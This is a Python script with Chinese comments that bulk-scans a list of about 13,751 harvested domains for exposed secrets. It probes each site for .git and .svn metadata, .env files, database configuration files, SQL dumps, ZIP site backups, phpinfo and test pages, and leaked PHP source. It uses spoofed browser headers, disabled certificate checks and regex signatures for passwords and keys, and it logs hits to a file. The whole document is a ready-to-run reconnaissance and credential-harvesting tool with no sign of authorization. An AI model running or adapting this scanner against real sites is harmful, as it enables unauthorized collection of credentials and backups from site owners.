#!/usr/bin/env python3
"""leak_scan.py - 批量信息泄露扫描(usable+alive池 13751站)
检测: PHP源码泄露 / .git .svn / 数据库备份 / 配置文件 / 目录遍历
输出: /tmp/leak_hits.txt (类型|域名|路径|详情)
"""
import urllib.request, ssl, socket, re, sys
from concurrent.futures import ThreadPoolExecutor, as_completed

socket.setdefaulttimeout(6)
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}

# 高价值泄露路径
LEAK_PATHS = [
    ('/.git/config', 'git-leak', r'\[core\]|repositoryformatversion'),
    ('/.svn/entries', 'svn-leak', r'dir|file|svn'),
    ('/.env', 'env-leak', r'DB_|APP_KEY|SECRET|PASSWORD|MAIL_'),
    ('/.DS_Store', 'ds-store', r''),
    ('/data/common.inc.php', 'db-config', r'cfg_dbpwd|dbpwd|password|dbpass'),
    ('/data/config.php', 'db-config', r'dbpwd|password|dbpass|dbuser'),
    ('/config.php', 'db-config', r'dbpwd|password|dbpass'),
    ('/database.sql', 'db-backup', r'CREATE TABLE|INSERT INTO'),
    ('/db.sql', 'db-backup', r'CREATE TABLE|INSERT INTO'),
    ('/backup.sql', 'db-backup', r'CREATE TABLE|INSERT INTO'),
    ('/www.zip', 'backup-zip', r''),
    ('/web.zip', 'backup-zip', r''),
    ('/site.zip', 'backup-zip', r''),
    ('/phpinfo.php', 'phpinfo', r'phpinfo|PHP Version|SERVER_ADDR'),
    ('/test.php', 'test-php', r''),
    ('/1.php', 'test-php', r''),
    ('/robots.txt', 'robots', r''),
]

def fetch(url, timeout=8):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=timeout, context=ctx)
        return r.status, r.read(50000)
    except urllib.error.HTTPError as e:
        return e.code, e.read(50000)
    except Exception:
        return 0, b''

def check_dom(dom):
    results = []
    # 1. 首页源码泄露检测(/plus/或/data/返回<?php)
    for p in ['/plus/list.php', '/data/common.inc.php', '/index.php']:
        st, b = fetch('http://'+dom+p)
        if b and b.lstrip().startswith(b'<?php'):
            results.append(('source-leak', dom, p, 'PHP源码泄露'))
            break
    # 2. 高价值泄露路径
    for path, typ, sig in LEAK_PATHS:
        try:
            st, b = fetch('http://'+dom+path, timeout=6)
            if st != 200 or len(b) < 20:
                continue
            txt = b.decode('utf-8', 'ignore')
            # 排除HTML首页(误报源): 泄露文件不该是完整HTML页面
            is_html = txt.lstrip().lower().startswith('<!doctype') or txt.lstrip().lower().startswith('<html') or txt.lstrip().lower().startswith('<head')
            if sig:
                # 严格签名匹配(真实泄露内容)
                if re.search(sig, txt, re.I) and not is_html:
                    results.append((typ, dom, path, txt[:100].replace(chr(10),' ')))
            else:
                # 无签名: 非404且非HTML首页且非空
                if not is_html and '404' not in txt[:60].lower() and 'not found' not in txt[:120].lower() and len(txt) > 50:
                    if path.endswith('.zip') and b[:2] == b'PK':
                        results.append((typ, dom, path, 'ZIP文件!'))
        except Exception:
            pass
    return results

def main():
    doms = []
    for f in ['/opt/msray/usable_pool.txt', '/opt/msray/alive_pool.txt']:
        try:
            doms += open(f).read().split()
        except: pass
    doms = list(set(doms))
    print('total: %d domains' % len(doms), flush=True)
    hits = []
    with ThreadPoolExecutor(max_workers=15) as ex:
        futs = {ex.submit(check_dom, d): d for d in doms}
        for i, fu in enumerate(as_completed(futs)):
            for r in fu.result():
                hits.append(r)
                print('LEAK: %s | %s | %s | %s' % r, flush=True)
            if (i+1) % 500 == 0:
                print('progress: %d/%d hits=%d' % (i+1, len(doms), len(hits)), flush=True)
    with open('/tmp/leak_hits.txt', 'w') as f:
        for h in hits:
            f.write('\t'.join(h) + '\n')
    print('=== DONE: %d leaks ===' % len(hits), flush=True)

if __name__ == '__main__':
    main()
